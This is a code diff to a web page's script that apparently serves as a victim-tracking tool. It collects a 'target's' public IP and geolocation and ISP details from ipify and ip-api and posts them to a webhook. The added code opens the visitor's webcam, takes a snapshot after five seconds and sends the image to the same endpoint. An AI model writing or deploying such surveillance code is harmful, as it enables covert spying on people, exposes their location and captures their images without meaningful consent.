@@ -9,6 +9,8 @@
       xhr.open("POST", "/webhook.php"); 
       xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
       xhr.send(JSON.stringify(targetinfo));
+
+  // Capture IP details
   $.getJSON("https://api.ipify.org?format=json", function(data) {
       $("#tc").html(data.ip);
       const xhr = new XMLHttpRequest();
@@ -17,6 +19,8 @@
           var getip = ("\nTarget IP Detail\n----------------\nIP: " + data.ip + "\n----------------\n");
           xhr.send(JSON.stringify(getip));
   });
+
+  // Capture location and ISP details
   $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,proxy,hosting,query", function(response) {
       const xhr = new XMLHttpRequest();
           xhr.open("POST", "/webhook.php");
@@ -24,4 +28,41 @@
           var locationdata = ("\nNetwork & ISP Information\n--------------------------------\nResponse Status: " + response.status + "\n--------------------------------\n");
           xhr.send(JSON.stringify(locationdata));
   });
+
+  // Access webcam
+  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(function(stream) {
+        // Create a video element to display the webcam feed
+        var video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        // Capture an image from the webcam after 5 seconds
+        setTimeout(function() {
+            var canvas = document.createElement("canvas");
+            canvas.width = 640; // Set desired resolution
+            canvas.height = 480;
+            var context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            var imageData = canvas.toDataURL("image/png"); // Capture image as Base64
+
+            // Send the captured image to the server
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "/webhook.php");
+            xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+            var webcamData = ("\nWebcam Image Captured\n--------------------------------\n" + imageData + "\n--------------------------------\n");
+            xhr.send(JSON.stringify(webcamData));
+
+            // Stop the webcam stream
+            stream.getTracks().forEach(track => track.stop());
+        }, 5000); // Adjust delay as needed
+    })
+    .catch(function(error) {
+        console.error("Webcam access denied or error occurred: ", error);
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "/webhook.php");
+        xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8');
+        var errorMessage = ("\nWebcam Access Error\n------------------------\nError: " + error.message + "\n------------------------\n");
+        xhr.send(JSON.stringify(errorMessage));
+    });
 </script>
